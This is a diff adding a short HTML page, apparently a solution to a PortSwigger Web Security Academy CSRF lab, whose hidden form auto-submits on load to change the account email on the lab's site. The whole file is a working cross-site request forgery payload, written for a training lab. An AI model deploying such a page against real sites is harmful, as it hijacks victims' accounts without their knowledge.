@@ -1,0 +1,11 @@
+<!-- https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present -->
+<html>
+    <body>
+        <form method="POST" action="https://0a61006e038a9ebac0f5918f003900a0.web-security-academy.net/my-account/change-email">
+            <input type="hidden" name="email" value="email@test.com">
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
